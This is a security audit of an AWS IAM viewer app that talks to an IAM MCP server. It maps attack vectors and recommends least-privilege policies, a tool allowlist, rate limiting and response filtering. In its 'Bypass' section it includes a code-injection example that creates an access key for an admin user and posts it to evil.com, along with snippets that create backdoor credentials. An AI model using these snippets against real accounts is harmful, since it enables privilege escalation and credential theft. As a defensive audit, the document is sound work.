# Security Audit: Permission Escalation Analysis

## Current App Design

### Intended Permissions (Read-Only Queries)
The app is designed to support 5 queries that require these AWS IAM permissions:
- `iam:ListUsers` - for "list of users"
- `iam:ListRoles` - for "list of roles"
- `iam:ListGroups` - for "list of groups"
- `iam:GetUser` - for "list of access keys" (calls GetUser for each user)

**Expected Permission Set**: Read-only IAM viewer

---

## Actual Permissions Available

### What the MCP Client Can Do
From `debug_mcp.py` output, the AWS IAM MCP Server exposes these tools:

**Read Operations** (Intended):
1. `list_users` - ✅ Used
2. `list_roles` - ✅ Used
3. `get_user` - ✅ Used
4. `list_policies`
5. `get_role`
6. `list_attached_user_policies`
7. `list_attached_role_policies`

**Write Operations** (DANGEROUS - Not Used but Available):
8. `create_user` ⚠️
9. `delete_user` ⚠️
10. `create_access_key` ⚠️
11. `delete_access_key` ⚠️
12. `create_role` ⚠️
13. `delete_role` ⚠️
14. `attach_user_policy` ⚠️
15. `detach_user_policy` ⚠️
16. `put_user_policy` ⚠️
17. `update_access_key` ⚠️

---

## Attack Vectors

### 1. Direct API Exploitation
**Vulnerability**: The FastAPI endpoints accept user input without validating against allowed operations.

**Attack Query via API**:
```bash
# Bypass UI and call API directly
curl -X POST http://localhost:8000/api/identities/collect \
  -H "Content-Type: application/json"
```

**What happens**:
- API calls `identity_collector.collect_all_identities()`
- This calls `aws_client.get_identity_details()`
- Which calls `list_iam_users()`, `list_iam_roles()`, `list_all_access_keys()`
- Each user requires `get_user_details(user_name)` call

**Permission Used**:
- `iam:ListUsers`
- `iam:ListRoles`
- `iam:GetUser` (for EVERY user in the account)

**Escalation**: An attacker could:
1. Map all users in the organization
2. Discover service accounts and automation users
3. Identify privileged accounts (admin-user, terraform-user, etc.)
4. Build a complete inventory for targeted attacks

---

### 2. MCP Client Direct Access
**Vulnerability**: The MCP client has methods that aren't exposed through the UI but ARE accessible if someone modifies the backend.

**Code Path**:
```python
# In src/mcp_client.py - AWSMCPClient has access to ALL tools
def call_tool(self, tool_name: str, arguments: Dict[str, Any]) -> Any:
    """Call a tool on the MCP server."""
    response = self._send_request("tools/call", {
        "name": tool_name,
        "arguments": arguments if arguments else {}
    })
```

**Attack**:
```python
# If an attacker can execute Python code or modify the backend:
client = AWSMCPClient(aws_profile="default")

# Create a new access key for an admin user
client.call_tool("create_access_key", {"user_name": "aws-admin-user"})

# Result: New credentials created for privilege escalation
```

**Permission Required**: `iam:CreateAccessKey`

**Impact**:
- Attacker creates new access keys for existing privileged users
- Bypasses MFA if user has it (access keys don't require MFA)
- Persistent backdoor access

---

### 3. Credential Harvesting via get_user
**Vulnerability**: The app calls `get_user` for every user to fetch access keys.

**Current Code** (src/mcp_client.py:344-384):
```python
def list_all_access_keys(self) -> List[Dict[str, Any]]:
    users = self.list_iam_users()
    for user in users:
        user_details = self.get_user_details(user_name)  # ⚠️ Calls GetUser
        access_keys = user_details.get("access_keys", [])
```

**Permission Used**:
- `iam:GetUser` called N times (once per user)

**Data Exposed by GetUser**:
```json
{
  "user_name": "aws-admin-user",
  "user_id": "AIDAZG73ANJFLZ7TFCQWF",
  "arn": "arn:aws:iam::633497217610:user/aws-admin-user",
  "path": "/",
  "create_date": "2025-05-19T18:41:47+00:00",
  "password_last_used": "2025-11-01T10:30:00+00:00",  // ⚠️ Leaks login activity
  "access_keys": [
    {
      "access_key_id": "AKIAZG73ANJFBYCF7FG7",  // ⚠️ Half of credential pair
      "status": "Active",
      "create_date": "2025-06-27T02:22:18+00:00"
    }
  ],
  "attached_policies": [...],  // ⚠️ Permission details
  "groups": [...]  // ⚠️ Group memberships
}
```

**Escalation**:
1. Attacker learns which users are actively logging in (`password_last_used`)
2. Identifies high-value targets (admin users with recent activity)
3. Access key IDs for credential stuffing/bruteforce
4. Account ID exposed in ARN (`633497217610`)
5. Policy attachments reveal permission levels

---

### 4. AWS Account Enumeration
**Vulnerability**: No rate limiting on queries. Responses include AWS Account ID.

**Attack**:
```bash
# Query 1: Get account ID
curl http://localhost:8000/api/identities/search -d '{"query":"list of users"}'
# Response includes ARN: "arn:aws:iam::633497217610:user/..."

# Query 2: Enumerate all users
curl http://localhost:8000/api/identities/search -d '{"query":"list of users"}'

# Query 3: Map all access keys
curl http://localhost:8000/api/identities/search -d '{"query":"list of access keys"}'

# Query 4: Find roles
curl http://localhost:8000/api/identities/search -d '{"query":"list of roles"}'
```

**Permission Used**: Read-only, but excessive enumeration

**Impact**:
- Complete infrastructure mapping
- No audit trail (unless CloudTrail enabled)
- Account ID disclosure
- Target list for social engineering

---

### 5. Policy & Permission Analysis (Currently Not Exploited)
**Vulnerability**: The `get_user` response includes attached policies, but the app doesn't display them.

**Available in Response (Not Shown in UI)**:
```json
{
  "attached_policies": [
    {
      "policy_name": "AdministratorAccess",
      "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess"
    }
  ],
  "groups": ["Administrators"]
}
```

**Escalation Path**:
1. Attacker views browser DevTools Network tab
2. Sees full API response with policy details
3. Identifies users with `AdministratorAccess`
4. Targets those users for credential theft

**Permission Used**:
- `iam:ListAttachedUserPolicies` (implicit in GetUser)
- `iam:ListGroupsForUser` (implicit in GetUser)

---

## Queries That Expose Excessive Permissions

### Read Queries (Already Working - Expose More Than Intended)

1. **"list of access keys"**
   - **Intended**: List key IDs
   - **Actually Uses**: `iam:GetUser` for every user
   - **Exposes**: User ARNs, Account ID, Password last used, Policies, Groups

2. **"list of users"**
   - **Intended**: Show usernames
   - **Actually Returns**: Full user objects with ARNs, IDs, paths
   - **Exposes**: Account structure, organizational hierarchy

### Queries That Would Require Write Permissions (Currently Blocked)

3. **"create access key for john.doe"**
   - **Would Require**: `iam:CreateAccessKey`
   - **Impact**: Backdoor credential creation
   - **Currently**: Blocked by UI filter, returns no results

4. **"delete user terraform-user"**
   - **Would Require**: `iam:DeleteUser`
   - **Impact**: Denial of service, infrastructure disruption
   - **Currently**: Blocked by UI filter

5. **"attach admin policy to vault-user"**
   - **Would Require**: `iam:AttachUserPolicy`
   - **Impact**: Privilege escalation
   - **Currently**: Blocked by UI filter

---

## Defense Bypass Techniques

### Bypass 1: Direct MCP Server Access
If attacker gains access to the server:
```python
from src.mcp_client import AWSMCPClient
client = AWSMCPClient()

# List all available tools
tools = client.list_tools()
print([t['name'] for t in tools])
# Output: ['create_user', 'delete_user', 'create_access_key', ...]

# Call any tool directly
client.call_tool("create_access_key", {"user_name": "aws-admin-user"})
```

### Bypass 2: Malicious Code Injection
If attacker can modify `identity_analyzer.py`:
```python
# Add before return statement
def search_identities(self, query: str, max_results: int = 20):
    # Existing code...

    # Malicious injection
    if "backdoor" in query:
        from .mcp_client import AWSMCPClient
        client = AWSMCPClient()
        # Create access key for attacker
        new_key = client.call_tool("create_access_key", {
            "user_name": "aws-admin-user"
        })
        # Exfiltrate to external server
        requests.post("https://evil.com/steal", json=new_key)

    return []
```

### Bypass 3: API Parameter Manipulation
Current search endpoint:
```python
@app.post("/api/identities/search")
async def search_identities(request: SearchRequest):
    # No validation on what operations are allowed
    collector = IdentityCollector(...)
    identities = collector.collect_all_identities()  # Always runs
    results = analyzer.search_identities(request.query)
```

Attack:
- Repeatedly call `/api/identities/search` with different queries
- Each call triggers `collect_all_identities()` → calls `GetUser` for all users
- No caching → excessive AWS API calls
- Could hit rate limits or trigger AWS alarms

---

## Risk Summary

| Attack Vector | Required Permission | Current Status | Impact |
|--------------|-------------------|----------------|--------|
| List all users | `iam:ListUsers` | ✅ Working | Medium - Enumeration |
| Map access keys | `iam:GetUser` | ✅ Working | High - Credential intel |
| View policies | `iam:ListAttachedUserPolicies` | ✅ In response (hidden) | High - Permission mapping |
| Create access key | `iam:CreateAccessKey` | ❌ Blocked by UI | Critical - Privilege escalation |
| Delete user | `iam:DeleteUser` | ❌ Blocked by UI | Critical - DoS |
| Account enumeration | Multiple read permissions | ✅ Working | High - Complete recon |

---

## Recommendations

### 1. Principle of Least Privilege
**Current**: AWS credentials likely have `IAMReadOnlyAccess` or broader
**Should Be**: Custom policy with ONLY:
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "iam:ListUsers",
        "iam:ListRoles",
        "iam:ListGroups"
      ],
      "Resource": "*"
    },
    {
      "Effect": "Allow",
      "Action": "iam:GetUser",
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "iam:ResourceTag/AllowNHIAccess": "true"
        }
      }
    }
  ]
}
```

### 2. Disable Write Operations in MCP Client
Filter available tools:
```python
ALLOWED_TOOLS = ['list_users', 'list_roles', 'get_user', 'list_groups']

def call_tool(self, tool_name: str, arguments: Dict[str, Any]):
    if tool_name not in ALLOWED_TOOLS:
        raise PermissionError(f"Tool {tool_name} not allowed")
    # Continue...
```

### 3. Rate Limiting
Add rate limiting to prevent enumeration:
```python
from slowapi import Limiter

limiter = Limiter(key_func=get_remote_address)

@app.post("/api/identities/search")
@limiter.limit("10/minute")  # Max 10 searches per minute
async def search_identities(request: SearchRequest):
    ...
```

### 4. Audit Logging
Log all queries:
```python
@app.post("/api/identities/search")
async def search_identities(request: SearchRequest):
    logger.info(f"Search query: {request.query} from IP: {request.client.host}")
    # Continue...
```

### 5. Response Filtering
Remove sensitive fields from responses:
```python
def sanitize_key_data(key: Dict) -> Dict:
    return {
        "user": key.get("UserName"),
        "status": key.get("status"),
        "age_days": calculate_age(key.get("create_date"))
        # DO NOT include: access_key_id, ARN, account_id
    }
```
